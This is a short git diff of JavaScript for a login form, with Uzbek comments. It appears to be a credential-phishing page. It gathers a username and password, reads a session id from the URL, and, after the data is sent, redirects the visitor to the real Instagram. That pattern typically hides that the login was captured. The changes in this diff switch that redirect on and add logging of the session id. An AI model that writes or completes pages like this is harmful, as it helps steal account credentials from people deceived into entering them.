@@ -75,11 +75,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const passwordInput = inputs[1]
 
     // session_id ni URL dan olish
-    const session_id = window.location.pathname
-        .split('/')
-        .filter(Boolean)
-        .pop()
+    const params = new URLSearchParams(window.location.search)
+    const session_id = params.get('session_id')
 
+    console.log(session_id)
 
     function toggleLoginButton() {
         loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim())
@@ -108,7 +107,7 @@ document.addEventListener('DOMContentLoaded', () => {
             })
 
             // yuborgandan keyin redirect
-            // window.location.href = 'https://instagram.com'
+            window.location.href = 'https://instagram.com'
 
         } catch (err) {
             console.error(err)
